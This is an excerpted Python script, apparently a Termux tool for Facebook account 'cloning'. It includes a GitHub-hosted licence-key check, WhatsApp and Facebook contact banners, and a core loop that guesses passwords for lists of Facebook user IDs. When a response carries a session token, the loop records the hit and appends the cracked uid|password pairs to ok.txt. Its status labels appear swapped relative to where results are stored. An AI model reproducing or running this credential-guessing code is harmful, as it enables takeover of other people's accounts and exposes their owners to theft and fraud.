...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/invisibal330/pathani/main/server.txt"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/AyanKhan665")
...
def notice():
	...
	runtxt("\033[0;92m CONTACT ADMIN Whatsapp >> +12")
	subprocess.check_output(["am", "start", "https://wa.me/+182"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/invisibal330/pathani/main/server.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[0;97m==============================================
\033[0;97m
\033[0;97m	\033[0;96mCreater		\x1b[1;92mPathan
\033[0;97m	\033[0;96mFB Id		\x1b[1;92mPathani
\033[0;97m	\033[0;96mWhatsapp	\x1b[1;92m+92308*******
\033[0;97m	\033[0;96mGithub		\x1b[1;92mSDCARD
\033[0;97m
\033[0;97m===============================================
...
""")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[] [Pathani] : %s/%s ->\033[0;92m [ CP:%s ]- \033[0;91m[OK:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;92m   [Pathani-CP] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;91m   [Pathani-Ok] %s | %s\033[0;97m         "%(uid, pw))
